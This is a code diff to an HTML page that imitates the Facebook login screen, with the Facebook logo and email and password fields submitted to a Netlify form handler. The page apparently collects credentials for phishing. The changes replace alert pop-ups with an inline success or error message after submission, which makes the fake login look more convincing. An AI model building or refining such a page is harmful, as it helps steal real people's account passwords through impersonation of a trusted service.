@@ -199,6 +199,20 @@
         .password-group .input-field {
             padding: 1rem 2.5rem 1rem 1rem;
         }
+        .form-message {
+            text-align: center;
+            margin: 1rem 0;
+            font-size: 1rem;
+            display: none;
+        }
+        .form-message.success {
+            color: #28a745;
+            display: block;
+        }
+        .form-message.error {
+            color: #dc3545;
+            display: block;
+        }
 
         /* Media Queries for Desktop */
         @media (min-width: 768px) {
@@ -293,7 +307,7 @@
         <a href="#" class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
         </a>
-        <form name="login" netlify data-netlify="true" action="/">
+        <form name="login" netlify data-netlify="true" action="#">
             <input type="hidden" name="form-name" value="login" />
             <div class="form-group">
                 <input type="text" class="input-field" id="email-input" name="email" placeholder=" " autocomplete="email" required>
@@ -305,6 +319,7 @@
                 <label for="password-input" class="floating-label">Password</label>
                 <i class="password-icon fa-solid fa-eye" onclick="togglePasswordVisibility('password-input', this)"></i>
             </div>
+            <div id="form-message" class="form-message"></div>
             <button type="submit" class="login-button">Log in</button>
         </form>
         <a href="#" class="forgot-password">Forgot password?</a>
@@ -345,7 +360,12 @@
             e.preventDefault();
             const form = e.target;
             const formData = new FormData(form);
-            
+            const messageDiv = document.getElementById('form-message');
+
+            // Clear previous messages
+            messageDiv.textContent = '';
+            messageDiv.classList.remove('success', 'error');
+
             try {
                 const response = await fetch('/', {
                     method: 'POST',
@@ -353,14 +373,17 @@
                 });
 
                 if (response.ok) {
-                    alert('Form submitted successfully!');
+                    messageDiv.textContent = 'Form submitted successfully!';
+                    messageDiv.classList.add('success');
                     form.reset();
                 } else {
-                    alert('Error submitting form. Please try again.');
+                    messageDiv.textContent = 'Error submitting form. Please try again.';
+                    messageDiv.classList.add('error');
                 }
             } catch (error) {
                 console.error('Submission error:', error);
-                alert('An error occurred. Please try again.');
+                messageDiv.textContent = 'An error occurred. Please try again.';
+                messageDiv.classList.add('error');
             }
         });
     </script>
